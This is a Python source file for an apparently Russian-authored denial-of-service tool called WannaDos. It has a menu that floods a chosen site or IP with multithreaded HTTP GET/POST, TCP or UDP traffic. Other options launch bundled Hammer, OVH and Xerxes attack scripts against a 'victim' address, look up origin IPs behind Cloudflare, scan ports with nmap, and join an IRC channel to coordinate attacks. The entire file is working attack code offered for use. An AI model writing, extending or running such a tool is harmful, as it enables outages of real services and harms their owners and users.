import os
import subprocess
from colorama import Fore, Back, Style
import time
import requests
import socket
import threading


t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())


what = '0' # лень было под True
conn = socket.socket()
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def tcp():
    print(Fore.CYAN + ' Dossing...')
    while what == '0':
        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
        try:
            conn.send(msg.encode())
            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + ip + ':' + str(port) + Fore.GREEN + '--> ' + msg)
                  
        except:
            print(t + Fore.RED + ' Server maybe down!!! ')
                  

def http():
    print(Fore.CYAN + ' Dossing...')
    while what == '0':
        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
        try:
            requests.get(site)
            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + site)
        except:
            print(t + Fore.RED + ' Server maybe down!!! ')

def udp():   
    print(Fore.CYAN + ' Dossing...')
    while what == '0':
        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
        try:
            udp_socket.sendto(msg, addr)
            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + ip + ':' + str(port) + Fore.GREEN + '--> ' + msg)
        except:
            print(t + Fore.RED + ' Server maybe down!!! ')

def httpost():
    print(Fore.CYAN + ' Dossing...')
    while what == '0':
        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
        try:
            requests.post(site, json={burunduk})
            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + site)
        except:
            print(t + Fore.RED + ' Server maybe down!!! ')


def cls():
    os.system('cls' if os.name=='nt' else 'clear')
def ban():
    cls()

	   						  
    print(Fore.GREEN + """
  _______   _______    ______        _______.
 |       \ |       \  /  __  \      /       |
 |  .--.  ||  .--.  ||  |  |  |    |   (----`
 |  |  |  ||  |  |  ||  |  |  |     \   \    
 |  '--'  ||  '--'  ||  `--'  | .----)   |   
 |_______/ |_______/  \______/  |_______/    
                                             """)
    print(Fore.CYAN + " by @wannadeauth | @wannadeauth_chat (telegram)")
    print("-------------------------------------------------\n")

def man():
    print(Fore.YELLOW +  " [1] Start attack | Начать атаку")
    print(Fore.WHITE + "")
    print(" [2] Узнать айпи домена, cloudflare cracker domens ip")
    print(Fore.RED + "")                             
    print(" [3] Сканировать порты | Scan open ports")
    print(Fore.BLUE + " ")                                                    
    print(" [4] Чат с DoS-ерами прямо не выходя из Termux, вы можете действовать слаженно")
    print("     чтобы повалить сильный сервер |")
    print("   ")
    print("    |  Chat with other attackers without leaving Termux, you can attack together,")
    print("     to bring down a strong server.")
    print(Fore.GREEN + "")

while True:
    ban()
    man()
    a = input(" Write parametr | Введите параметр : ")

    if a == "1":

        ban()
        print(Fore.YELLOW + ' [1] WannaDos (best choice)\n')
        print(' [2] Hammer\n')
        print(' [3] DOS Attack OVH\n')
        print(' [4] Xerxes Dos attack\n\n')

        wdos = input(Fore.BLUE + ' Choose script | Выберите скрипт: ')
        ban()

        if wdos == '1':
          
            ban()
            print(Fore.GREEN + ' [1] HTTP (metod GET) (simple)\n')
            print(' [2] HTTP (metod POST)\n')
            print(' [3] TCP\n')
            print(' [4] UDP\n\n')
            metod = input(Fore.MAGENTA + ' Metod: ')
            if metod == '1':
                site = input(Fore.WHITE + 'Site: ')
                thr = int(input(Fore.RED + ' Threads (100-800): '))
                for i in range(thr):
                    threading.Thread(target=http).start()
                http()
            elif metod == '2':
                site = input(Fore.WHITE + 'Site: ')
                burunduk = input(' POST data (json): ')
                thr = int(input(Fore.RED + ' Threads (100-800): '))
                for i in range(thr):
                    threading.Thread(target=httpost).start()
                httpost()

            elif metod == '3':
                ip = input(Fore.CYAN + ' IP address: ')
                port = input(' Port: ') 
                conn.connect((ip, int(port)))
                msg = input(Fore.WHITE + ' Text message for dos: ')
                thr = int(input(Fore.RED + ' Threads (100-800): '))
                for i in range(thr):
                    threading.Thread(target=tcp).start()
                tcp()

            elif metod == '4':
                ip = input(Fore.CYAN + ' IP address: ')
                port = input(' Port: ')
                msg = input(Fore.WHITE + ' Text message for dos: ')
                thr = int(input(Fore.RED + ' Threads (100-800): '))
                addr = (ip, int(port))
                for i in range(thr):
                    threading.Thread(target=udp).start()
                udp()


        elif wdos == '2':
            ip = input("Введите ip адрес жертвы | Type ip adress of victim: ")
            port = input("Введите порт | Port: ")
            strong = input("Кол-во потоков (сила) | Current/strong of attack \n Желательно от 150 до 700 | Preferably in range of 150 700: ")
            list_files = subprocess.run(["python", "sub/2/hammer.py" ,"-s"  , ip , "-p" , port , "-t" , strong])

        elif wdos == '3':
            port = input(' Port 80/443: ')
            os.chdir('core/3')
            if port == '80':
                os.system('python 80port.py')
            elif port == '443':
                os.system('python 443port.py')

        elif wdos == '4':
            os.chdir('core/4/XERXES')
            os.system('gcc -o xerxes xerxes.c')
            ip = input(Fore.WHITE + ' IP: ')
            port = input(Fore.MAGENTA + ' Port:')
            os.system('./xerxes ' + ip + ' ' + port)

    elif a == "2":
        list_files = subprocess.run(["python", "core/cloud.py"])

    elif a == "3":
        ip1 = input("Введите ip адрес для сканирования | Type ip for scanning ports: ")
        port1 = input("Введите порты | Write ports \n Пример | Example 21-80,443,7777,8080: ")
        list_files = subprocess.run(["nmap" , "-sV" , ip1 , "-p" , port1])
    elif a == "4":
        ban()
        print(Fore.WHITE + " ")
        print("  В открывшемся окне, после Irssi, пишем такие команды: ")
        print(Fore.RED + " ")
        print("     /connect chat.freenode.com") 
        print("   ")
        print("     /join doser")
        print(Fore.WHITE + " ")
        print("Все! Вы в чате!!!")
        print(" ")
        print(Fore.YELLOW + " ")

        print(" [1] Irssi")
        print(" ")
        print(" [2] Установить модуль Irssi")
        print(" ")
        print(Fore.GREEN + " ")
        b = input("Выберите действие: ")
        if b == "2":

            list_files = subprocess.run(["apt-get" , "install" , "irssi"])
                                         
        if b == "1":
            list_files = subprocess.run(["irssi"])

    else:
        print("Задана неверная функция | Wrong fuction has been setup")

    time.sleep(7)



